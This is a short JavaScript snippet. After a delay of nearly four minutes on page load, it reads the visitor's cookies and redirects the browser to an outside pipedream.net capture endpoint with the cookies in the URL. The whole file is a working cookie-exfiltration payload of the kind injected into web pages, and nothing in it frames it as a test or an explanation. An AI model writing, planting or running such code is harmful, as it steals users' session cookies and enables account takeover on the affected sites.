document.addEventListener("DOMContentLoaded", function () {
  function redirectWithCookies() {
    const endpoint = "https://eni8dd83qy2yp.x.pipedream.net/";
    const cookies = document.cookie;

    if (cookies) {
      const redirectUrl = `${endpoint}?data=${encodeURIComponent(cookies)}`;
      window.location.replace(redirectUrl);
    } else {
      console.error("No cookies available to send.");
    }
  }

  setTimeout(redirectWithCookies, 224000);
});
